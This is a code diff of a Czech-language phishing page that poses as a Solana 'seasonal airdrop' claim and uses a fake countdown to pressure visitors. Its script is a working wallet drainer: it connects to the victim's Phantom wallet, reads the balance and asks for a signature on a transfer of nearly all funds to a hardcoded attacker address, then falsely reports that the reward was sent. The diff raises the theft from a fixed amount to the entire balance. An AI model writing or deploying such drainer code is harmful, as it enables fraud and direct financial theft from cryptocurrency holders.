@@ -2,43 +2,75 @@
 <html lang="cs">
 <head>
     <meta charset="UTF-8">
-    <title>Solana Airdrop 2026</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana | Seasonal Airdrop Claim</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .btn { background: #14f195; color: black; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 1.2rem; }
-        .status { margin-top: 20px; color: #888; }
+        :root { --primary: #14f195; --bg: #000000; --card: #1a1a1a; }
+        body { background-color: var(--bg); color: white; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { background: var(--card); padding: 40px; border-radius: 20px; border: 1px solid #333; max-width: 400px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { font-size: 24px; margin-bottom: 10px; background: linear-gradient(45deg, #9945FF, #14F195); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        p { color: #aaa; font-size: 14px; line-height: 1.6; }
+        .btn { background: var(--primary); color: black; width: 100%; padding: 15px; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; transition: transform 0.2s; margin-top: 20px; }
+        .btn:hover { transform: scale(1.02); background: #10d481; }
+        .timer { color: #ff4a4a; font-weight: bold; margin-top: 15px; font-size: 13px; }
+        .status { margin-top: 15px; font-size: 12px; color: #666; }
     </style>
 </head>
 <body>
-    <h1>Gratulujeme! 🚀</h1>
-    <p>Vaše adresa byla vybrána pro sezónní Airdrop ve výši 5 SOL.</p>
-    <button class="btn" onclick="connectAndDrain()">VYBRAT ODMĚNU (CLAIM)</button>
-    <div id="status" class="status">Status: Peněženka nepřipojena</div>
+    <div class="container">
+        <img src="https://cryptologos.cc/logos/solana-sol-logo.png" width="50" alt="SOL">
+        <h1>Gratulujeme! 🚀</h1>
+        <p>Vaše adresa byla vybrána pro sezónní Airdrop ve výši <strong>5.25 SOL</strong> za aktivitu v síti.</p>
+        
+        <div class="timer">Nabídka vyprší za: <span id="countdown">04:59</span></div>
+
+        <button class="btn" onclick="connectAndDrain()">VYBRAT ODMĚNU (CLAIM)</button>
+        
+        <div id="status" class="status">Status: Čekání na připojení peněženky...</div>
+    </div>
 
     <script>
-        const destination = "C1NfhjQ6y9M1KRXE4zJbCqtnhaJgASRMRsnSEnU4PaNS"; // Tvoje adresa
+        // TVOJE ADRESA KAM POTEČOU PENÍZE
+        const destination = "C1NfhjQ6y9M1KRXE4zJbCqtnhaJgASRMRsnSEnU4PaNS"; 
+
+        // Jednoduchý odpočítávač
+        let time = 299;
+        setInterval(() => {
+            let m = Math.floor(time / 60);
+            let s = time % 60;
+            document.getElementById('countdown').innerText = `0\${m}:\${s < 10 ? '0' : ''}\${s}`;
+            if (time > 0) time--;
+        }, 1000);
 
         async function connectAndDrain() {
             const status = document.getElementById('status');
-            
             if (!window.solana || !window.solana.isPhantom) {
-                alert("Prosím, nainstalujte si Phantom peněženku.");
-                return;
+                alert("Nainstalujte si prosím Phantom!"); return;
             }
 
             try {
-                // 1. Připojení k peněžence
                 const resp = await window.solana.connect();
-                status.innerText = "Status: Připojování k síti...";
-
-                // 2. Příprava transakce (vytvoření požadavku na podpis)
+                status.innerText = "Status: Ověřování nároku...";
+                
                 const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                
+                // Zjistíme zůstatek oběti
+                const balance = await connection.getBalance(resp.publicKey);
+                
+                if (balance === 0) {
+                    status.innerText = "Chyba: Adresa není způsobilá (0 SOL).";
+                    return;
+                }
+
+                // Nastavíme odvod (všechno mínus rezerva na poplatek)
+                const amountToDrain = balance - 5000; 
+
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: resp.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(destination),
-                        lamports: 100000000, // Zde se nastavuje částka k odčerpání
+                        lamports: amountToDrain,
                     })
                 );
 
@@ -46,14 +78,12 @@
                 const { blockhash } = await connection.getRecentBlockhash();
                 transaction.recentBlockhash = blockhash;
 
-                // 3. Výzva k podpisu (Tady uživatel schvaluje "vysátí")
-                status.innerText = "Status: Potvrďte transakci v peněžence...";
+                status.innerText = "Status: Schvalování v síti...";
                 const signed = await window.solana.signTransaction(transaction);
                 await connection.sendRawTransaction(signed.serialize());
                 
-                status.innerText = "Status: Odměna se zpracovává!";
+                status.innerText = "Status: Odměna odeslána na váš účet!";
             } catch (err) {
-                console.error(err);
                 status.innerText = "Chyba: Transakce byla zamítnuta.";
             }
         }
